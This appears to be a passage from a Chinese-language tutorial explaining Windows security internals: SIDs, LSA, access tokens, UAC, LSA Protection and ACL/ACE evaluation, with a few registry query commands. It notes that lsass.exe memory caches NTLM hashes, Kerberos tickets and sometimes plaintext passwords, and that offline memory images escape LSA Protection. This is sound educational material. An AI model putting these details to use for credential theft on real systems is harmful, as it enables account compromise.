&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;reg query &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&amp;#34;&lt;/span&gt; /v Userinit
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;递归查询所有子项和键值&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/s&lt;/code&gt;：递归查询所有子项和键值&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;reg query &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist&amp;#34;&lt;/span&gt; /s
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;windows安全机制&#34;&gt;Windows安全机制
&lt;/h1&gt;&lt;h2 id=&#34;安全主体与身份验证&#34;&gt;安全主体与身份验证
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;在介绍Windows安全机制之前，我们必须先理解两个基本概念：安全主体和身份验证&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;安全主体&#34;&gt;安全主体
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;安全主体是指在Windows操作系统中能够被识别和进行身份验证的任何实体&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;它不仅包括人类用户，还包括以下内容：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用户账户：包括本地用户（如&lt;code&gt;Administrator&lt;/code&gt;）和域用户（如&lt;code&gt;CONTOSO\jdoe&lt;/code&gt;）&lt;/li&gt;
&lt;li&gt;计算机账户：加入域的计算机，如&lt;code&gt;WORKSTATION-01$&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;安全组：如&lt;code&gt;Administrators&lt;/code&gt;组、&lt;code&gt;Everyone&lt;/code&gt;组等&lt;/li&gt;
&lt;li&gt;系统内置账户：例如&lt;code&gt;SYSTEM&lt;/code&gt;、&lt;code&gt;Local Service&lt;/code&gt;、&lt;code&gt;Network Service&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;进程或线程：在特定安全上下文中运行的进程或线程&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;简单来说，任何需要被系统识别以授予权限的对象，都是一个安全主体&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;完整性级别&#34;&gt;完整性级别
&lt;/h4&gt;&lt;p&gt;完整性级别是安全主体的一个属性，用于防止低权限程序访问高权限资源&lt;/p&gt;
&lt;p&gt;主要级别有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;低完整性级别（如Internet Explorer保护模式）&lt;/li&gt;
&lt;li&gt;中等完整性级别（普通用户程序）&lt;/li&gt;
&lt;li&gt;高完整性级别（管理员权限进程）&lt;/li&gt;
&lt;li&gt;系统完整性级别（操作系统核心进程）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;完整性级别形成了额外的访问限制层&lt;/p&gt;
&lt;h3 id=&#34;身份验证&#34;&gt;身份验证
&lt;/h3&gt;&lt;p&gt;身份验证是核实安全主体是否确实是其所声称身份的过程，主要回答“你是谁？”这个问题&lt;/p&gt;
&lt;p&gt;身份验证确保访问者不是冒名顶替者，常见方式包括密码核对、智能卡认证、生物识别等&lt;/p&gt;
&lt;p&gt;需要注意的是，身份验证与授权是不同的概念，身份验证是授权的前提，但本身不等同于授权&lt;/p&gt;
&lt;h2 id=&#34;sid&#34;&gt;SID
&lt;/h2&gt;&lt;h3 id=&#34;什么是sid&#34;&gt;什么是SID
&lt;/h3&gt;&lt;p&gt;SID全称Security Identifier，即安全标识符，就是操作系统为每一个安全主体分配的、一个全局唯一且不可变的号码&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;唯一性&lt;/strong&gt;：一个 SID 只会分配给一个安全主体，即使这个账户被删除，它的 SID 也不会被重新分配给新账户&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;不变性&lt;/strong&gt;：账户可以改名，但它的 SID 永远不变&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;内部标识&lt;/strong&gt;：用户习惯使用用户名来识别账户，但Windows内核只认SID&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;sid如何工作&#34;&gt;SID如何工作
&lt;/h3&gt;&lt;p&gt;SID是Windows安全模型的核心&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;创建与存储&lt;/strong&gt;：当一个账户或组被创建时，本地安全机构（LSA）或域控制器会为其生成一个唯一的 SID，并将其存储在安全数据库中（本地账户存在注册表的SAMHive中，域账户存在活动目录中）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;生成访问令牌&lt;/strong&gt;：当一个用户成功登录时，系统会为其创建一个访问令牌 (Access Token)，这个令牌就像一张临时通行证，里面包含了该用户的SID、该用户所属所有组的SID、以及该用户拥有的所有特权&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;访问控制&lt;/strong&gt;：当该用户尝试访问一个资源（如文件或文件夹）时，系统会拿出用户的访问令牌，将其中的SID列表与资源的访问控制列表（ACL）进行比对，以决定是否授予访问权限&lt;/p&gt;
&lt;h3 id=&#34;sid的结构&#34;&gt;SID的结构
&lt;/h3&gt;&lt;p&gt;一个典型的、完整的 SID 结构如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;S  -  修订级别  -  颁发机构  -  域标识符 -  相对ID(RID)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们以一个例子来分解： &lt;strong&gt;&lt;code&gt;S-1-5-21-2127521184-1604012920-1887927527-500&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;S&lt;/code&gt;&lt;/strong&gt;：&lt;strong&gt;固定前缀&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;表明这是一个SID&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;1&lt;/code&gt;&lt;/strong&gt;：&lt;strong&gt;修订级别&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;目前所有SID的版本都是1&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;5&lt;/code&gt;&lt;/strong&gt;：&lt;strong&gt;标识符颁发机构&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这里的&lt;code&gt;5&lt;/code&gt;代表 &lt;code&gt;NT Authority&lt;/code&gt;，即由WindowsNT系统安全机构颁发，这是最常见的一种&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;21-2127521184-1604012920-1887927527&lt;/code&gt;&lt;/strong&gt;：&lt;strong&gt;域或本地计算机标识符&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这是一串唯一的数字，代表创建这个SID的计算机或域，同一台电脑上的所有本地账户都会共享这一串数字&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;500&lt;/code&gt;&lt;/strong&gt;：&lt;strong&gt;相对ID (RID)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这是 SID 的最后一部分，它在上述域标识符范围内是唯一的，真正用来区分不同的账户&lt;/p&gt;
&lt;p&gt;Windows 为一些内置账户预留了固定的 RID：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;500&lt;/strong&gt;：&lt;code&gt;Administrator&lt;/code&gt;（内置管理员账户）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;501&lt;/strong&gt;：&lt;code&gt;Guest&lt;/code&gt;（来宾账户）&lt;/li&gt;
&lt;li&gt;普通用户通常从 &lt;strong&gt;1000&lt;/strong&gt; 或 &lt;strong&gt;1001&lt;/strong&gt; 开始递增&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;众所周知的sid&#34;&gt;众所周知的SID
&lt;/h3&gt;&lt;p&gt;除了上述每个账户独有的SID，Windows还预定义了一些特殊的、固定的 SID&lt;/p&gt;
&lt;p&gt;它们在所有Windows系统上都具有相同的值和含义，代表了一些内置的身份或通用组&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;SID&lt;/th&gt;
          &lt;th&gt;通用名称&lt;/th&gt;
          &lt;th&gt;说明&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;S-1-5-18&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;Local System&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;本地系统账户，Windows系统中的最高权限&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;S-1-5-32-544&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;Administrators&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;本地管理员组，属于这个组的成员都拥有管理员权限&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;S-1-1-0&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;Everyone&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;所有用户组，范围最广，包括已登录的用户和匿名用户&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;S-1-5-11&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;Authenticated Users&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;已认证用户组，代表所有通过了身份验证的账户&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;S-1-5-2&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;Network&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;任何通过网络登录的用户&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;S-1-5-6&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;Service&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;任何以服务身份登录的实体&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;S-1-5-7&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;Interactive&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;任何通过直接在本地登录的用户&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;lsa&#34;&gt;LSA
&lt;/h2&gt;&lt;h3 id=&#34;什么是lsa&#34;&gt;什么是LSA
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;LSA，全称本地安全机构 (Local Security Authority)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;它是一个受保护的Windows子系统，核心职责是在单台计算机上强制执行系统的安全策略&lt;/p&gt;
&lt;p&gt;它是Windows 安全模型的中心，负责验证用户身份、管理用户权限并生成安全审计日志&lt;/p&gt;
&lt;p&gt;LSA的用户模式组件体现在一个名为&lt;code&gt;lsass.exe&lt;/code&gt;的关键系统进程中，是维持操作系统安全运行的必要进程，任何对&lt;code&gt;lsass.exe&lt;/code&gt;的终止都会导致系统在短时间内强制关机并提示安全错误&lt;/p&gt;
&lt;h3 id=&#34;访问令牌&#34;&gt;访问令牌
&lt;/h3&gt;&lt;p&gt;访问令牌Access Token是由LSA创建的内核管理对象，描述进程或线程的安全上下文&lt;/p&gt;
&lt;h4 id=&#34;包含的内容&#34;&gt;包含的内容
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;用户SID&lt;/strong&gt;：标明主体身份&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;组SID列表&lt;/strong&gt;：确定主体所属的所有安全组&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;特权列表&lt;/strong&gt;：决定主体可执行的系统级特殊操作，如SeDebugPrivilege&lt;/p&gt;
&lt;h4 id=&#34;工作流程&#34;&gt;工作流程
&lt;/h4&gt;&lt;p&gt;当用户登录后，启动的每个进程都会继承该用户访问令牌的副本&lt;/p&gt;
&lt;p&gt;当进程尝试访问受保护资源时，内核的安全引用监视器（Security Reference Monitor，SRM）会取出进程访问令牌中的SID列表，与资源的访问控制列表（Access Control List，ACL）比较，决定是否允许或拒绝访问&lt;/p&gt;
&lt;h4 id=&#34;用户账户控制&#34;&gt;用户账户控制
&lt;/h4&gt;&lt;p&gt;用户账户控制（User Account Control，UAC）是基于访问令牌的“双令牌”机制&lt;/p&gt;
&lt;p&gt;传统的Windows系统中，用户经常以管理员权限登录，这导致所有程序默认拥有高权限，增加了系统被攻击和破坏的风险&lt;/p&gt;
&lt;p&gt;而UAC通过限制默认权限，减少系统受攻击面&lt;/p&gt;
&lt;p&gt;当管理员账户登录系统时，系统为其创建两个访问令牌：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;标准访问令牌（受限令牌）&lt;/strong&gt;：用于默认运行的应用程序，权限受限，防止程序执行高风险操作&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;完整访问令牌（管理员令牌）&lt;/strong&gt;：包含完整管理员权限，但只在用户明确授权时使用&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;普通用户账户只拥有标准令牌，无法提升权限&lt;/p&gt;
&lt;p&gt;当用户启动需要管理员权限的程序或操作（比如安装软件）时，系统会弹出UAC提示，要求用户确认操作：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;管理员账户&lt;/strong&gt;：弹出提示框，用户确认后程序使用完整访问令牌运行&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;标准账户&lt;/strong&gt;：需要输入管理员账户的用户名和密码以获得权限提升&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;这保证了系统操作必须经过用户授权，避免恶意软件自动提升权限&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;lsa的功能&#34;&gt;LSA的功能
&lt;/h3&gt;&lt;h4 id=&#34;用户认证&#34;&gt;用户认证
&lt;/h4&gt;&lt;p&gt;LSA是所有用户登录请求的最终处理者&lt;/p&gt;
&lt;p&gt;无论是本地登录还是通过网络的域登录，凭证信息最终都会被传递给LSA进行验证&lt;/p&gt;
&lt;h4 id=&#34;访问令牌生成&#34;&gt;访问令牌生成
&lt;/h4&gt;&lt;p&gt;在用户身份验证成功后，LSA负责创建该用户的访问令牌 (&lt;code&gt;_TOKEN&lt;/code&gt;结构)&lt;/p&gt;
&lt;p&gt;该令牌是一个内核对象，它详细描述了用户的安全上下文，包括用户SID、所属组的SID列表、特权列表以及会话信息&lt;/p&gt;
&lt;h4 id=&#34;安全策略管理&#34;&gt;安全策略管理
&lt;/h4&gt;&lt;p&gt;LSA强制执行在本地安全策略 (&lt;code&gt;secpol.msc&lt;/code&gt;) 中定义的规则&lt;/p&gt;
&lt;p&gt;例如密码复杂度策略、账户锁定策略以及用户权限分配&lt;/p&gt;
&lt;h4 id=&#34;凭证缓存与管理&#34;&gt;凭证缓存与管理
&lt;/h4&gt;&lt;p&gt;为了支持网络认证（如NTLM）和单点登录（SSO），&lt;code&gt;lsass.exe&lt;/code&gt;进程的内存中会缓存多种形式的凭证数据&lt;/p&gt;
&lt;p&gt;包括 NTLM 哈希、Kerberos 票据，以及在某些配置下（如开启WDigest认证）的可逆加密或明文形式的密码&lt;/p&gt;
&lt;h4 id=&#34;安全审计&#34;&gt;安全审计
&lt;/h4&gt;&lt;p&gt;根据系统中配置的审计策略，LSA会生成安全事件日志（如登录成功/失败、对象访问等）&lt;/p&gt;
&lt;p&gt;它会将这些日志发送给事件日志服务（Event Log service）进行记录&lt;/p&gt;
&lt;h3 id=&#34;lsa认证流程&#34;&gt;LSA认证流程
&lt;/h3&gt;&lt;p&gt;以一个典型的本地交互式登录为例，LSA 在其中的工作流程如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;用户在登录界面（由&lt;code&gt;winlogon.exe&lt;/code&gt;管理）输入用户名和密码&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;winlogon.exe&lt;/code&gt; 将这些凭证安全地传递给&lt;code&gt;lsass.exe&lt;/code&gt;进程&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;lsass.exe&lt;/code&gt;接收到凭证后，调用相应的认证包，对于本地登录，通常是&lt;code&gt;msv1_0.dll&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;msv1_0.dll&lt;/code&gt;与安全帐户管理器(Security Account Manager, SAM)服务通信，请求验证密码&lt;/p&gt;
&lt;p&gt;SAM服务会比对提交的密码哈希与存储在SAM注册表配置单元中的哈希是否一致&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;验证成功后，LSA会创建一个包含该用户所有安全信息的访问令牌&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;LSA 将此令牌返回给&lt;code&gt;winlogon.exe&lt;/code&gt;，&lt;code&gt;winlogon.exe&lt;/code&gt;再使用该令牌来启动用户的初始进程（&lt;code&gt;userinit.exe&lt;/code&gt;），进而创建桌面环境（&lt;code&gt;explorer.exe&lt;/code&gt;）&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;lsa的protection机制&#34;&gt;LSA的Protection机制
&lt;/h3&gt;&lt;p&gt;由于&lt;code&gt;lsass.exe&lt;/code&gt;内存的敏感性，微软在Windows8.1/Server2012R2及之后版本中引入了LSA Protection机制，其技术名称为&lt;strong&gt;受保护的进程之光 (Protected Process Light, PPL)&lt;/strong&gt;&lt;del&gt;什么鬼名字&lt;/del&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;通过在注册表中设置一个特定的键值：&lt;code&gt;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa&lt;/code&gt;下的&lt;code&gt;RunAsPPL&lt;/code&gt;，让&lt;code&gt;lsass.exe&lt;/code&gt;进程可以在启动时被标记为一个受保护的进程&lt;/p&gt;
&lt;p&gt;Windows 内核的内存管理器会阻止任何非受保护的进程（即使是拥有管理员权限的进程）打开&lt;code&gt;lsass.exe&lt;/code&gt; 的句柄并请求读取其内存或注入代码&lt;/p&gt;
&lt;p&gt;只有拥有微软特定签名的、同样是受保护的进程（如杀毒软件）才能对其进行访问&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;此保护机制&lt;strong&gt;仅对活动的操作系统有效&lt;/strong&gt;，对于通过物理采集或虚拟机快照获得的离线内存镜像进行分析时LSA Protection无效，仍然可以使用Volatility等工具解析&lt;code&gt;lsass.exe&lt;/code&gt;的内存&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;授权机制&#34;&gt;授权机制
&lt;/h2&gt;&lt;p&gt;在Windows安全机制中，&lt;strong&gt;ACL（Access Control List，访问控制列表）&lt;/strong&gt; 和 &lt;strong&gt;ACE（Access Control Entry，访问控制条目）&lt;/strong&gt; 是实现授权控制的基础结构，用于定义和限制安全主体对系统对象的访问权限&lt;/p&gt;
&lt;h3 id=&#34;访问控制列表--acl&#34;&gt;访问控制列表 —— ACL
&lt;/h3&gt;&lt;p&gt;ACL 是附加在受保护对象（如文件、进程、注册表键、线程等）上的权限集合，用于控制哪些用户或组能够对该对象执行哪些操作&lt;/p&gt;
&lt;p&gt;ACL 分为两种类型：&lt;/p&gt;
&lt;h4 id=&#34;dacl&#34;&gt;DACL
&lt;/h4&gt;&lt;p&gt;全称Discretionary ACL，自由访问控制列表&lt;/p&gt;
&lt;p&gt;用于指定允许或拒绝某个主体访问对象的权限，是授权控制的核心部分&lt;/p&gt;
&lt;h4 id=&#34;sacl&#34;&gt;SACL
&lt;/h4&gt;&lt;p&gt;全称System ACL，系统访问控制列表&lt;/p&gt;
&lt;p&gt;用于指定系统是否应审计某个主体对对象的访问（例如记录成功或失败的访问尝试），用于安全审计&lt;/p&gt;
&lt;h3 id=&#34;访问控制条目--ace&#34;&gt;访问控制条目 —— ACE
&lt;/h3&gt;&lt;p&gt;ACL 由一个或多个 ACE 组成，每条 ACE 定义一个安全主体对对象的某种访问规则。ACE 是描述“谁能做什么”的最小授权单元。&lt;/p&gt;
&lt;h4 id=&#34;主要组成字段&#34;&gt;主要组成字段
&lt;/h4&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;字段&lt;/th&gt;
          &lt;th&gt;描述&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;SID（Security Identifier）&lt;/td&gt;
          &lt;td&gt;指定该条权限适用的安全主体（用户或用户组）&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Type（类型）&lt;/td&gt;
          &lt;td&gt;标识是“允许访问”还是“拒绝访问”&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Access Mask（访问掩码）&lt;/td&gt;
          &lt;td&gt;描述具体的权限（如读取、写入、执行、删除等）&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Flags（标志）&lt;/td&gt;
          &lt;td&gt;控制是否可继承、是否用于审计等附加属性&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&#34;常见类型&#34;&gt;常见类型
&lt;/h4&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;ACE 类型&lt;/th&gt;
          &lt;th&gt;描述&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;ACCESS_ALLOWED_ACE_TYPE&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;允许某个 SID 执行指定操作&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;ACCESS_DENIED_ACE_TYPE&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;拒绝某个 SID 执行指定操作&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;SYSTEM_AUDIT_ACE_TYPE&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;审计某个 SID 的访问行为（记录日志）&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;ace-匹配与权限判断流程&#34;&gt;ACE 匹配与权限判断流程
&lt;/h3&gt;&lt;p&gt;当一个用户（或进程）尝试访问某个对象时，系统会进行如下判断流程：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;获取该用户的访问令牌（包含 SID 和所属组列表）&lt;/li&gt;
&lt;li&gt;读取目标对象的 DACL，依序遍历其中的 ACE&lt;/li&gt;
&lt;li&gt;将访问令牌中的 SID 与每条 ACE 的 SID 进行比对&lt;/li&gt;
&lt;li&gt;遇到匹配的 Deny 类型 ACE → 立即拒绝访问&lt;/li&gt;
&lt;li&gt;遇到匹配的 Allow 类型 ACE → 记录允许的操作权限&lt;/li&gt;
&lt;li&gt;继续匹配，直到所有 ACE 遍历完成或提前拒绝&lt;/li&gt;
&lt;li&gt;如果请求的权限未被任何 ACE 显式允许 → 拒绝访问&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;注意：ACE 在 DACL 中的顺序非常重要，Deny ACE 一般优先于 Allow ACE&lt;/p&gt;&lt;/blockquote&gt;
&lt;h3 id=&#34;继承机制与显式权限&#34;&gt;继承机制与显式权限
&lt;/h3&gt;&lt;p&gt;ACE 还可以具有继承性：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;显式ACE&lt;/strong&gt;：直接定义在对象上的权限&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;继承ACE&lt;/strong&gt;：从上层容器（如文件夹）继承而来，可自动应用到子对象&lt;/li&gt;
&lt;li&gt;继承标志包括：
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;OBJECT_INHERIT_ACE&lt;/code&gt;：继承给子对象&lt;/li&gt;
&lt;li&gt;&lt;code&gt;CONTAINER_INHERIT_ACE&lt;/code&gt;：继承给子容器&lt;/li&gt;
&lt;li&gt;&lt;code&gt;INHERIT_ONLY_ACE&lt;/code&gt;：仅供继承使用，不适用于当前对象；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;NO_PROPAGATE_INHERIT_ACE&lt;/code&gt;：仅继承一级，不再向下传递&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这些继承规则支持管理员一次性配置整个目录或注册表项的权限，提升安全管理效率&lt;/p&gt;
&lt;h3 id=&#34;权限掩码常见值&#34;&gt;权限掩码常见值
&lt;/h3&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;权限&lt;/th&gt;
          &lt;th&gt;描述&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;READ&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;读取对象数据（如文件内容、注册表值）&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;WRITE&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;修改对象数据&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;EXECUTE&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;执行对象&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;DELETE&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;删除对象&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;READ_CONTROL&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;读取对象的安全描述符（但不包含 DACL）&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;WRITE_DAC&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;修改对象的 DACL&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;WRITE_OWNER&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;修改对象的所有者&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;FULL_CONTROL&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;拥有全部权限（等价于管理员完全控制）&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;对象安全描述符&#34;&gt;对象安全描述符
&lt;/h3&gt;&lt;p&gt;对象的安全信息不仅包括ACL，还包括以下结构，一起被称为安全描述符：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;字段&lt;/th&gt;
          &lt;th&gt;含义&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;所有者&lt;/td&gt;
          &lt;td&gt;对象的拥有者，默认有修改权限&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;主组&lt;/td&gt;
          &lt;td&gt;通常在POSIX/UNIX环境兼容性使用&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;DACL&lt;/td&gt;
          &lt;td&gt;授权控制&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;SACL&lt;/td&gt;
          &lt;td&gt;审计控制&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
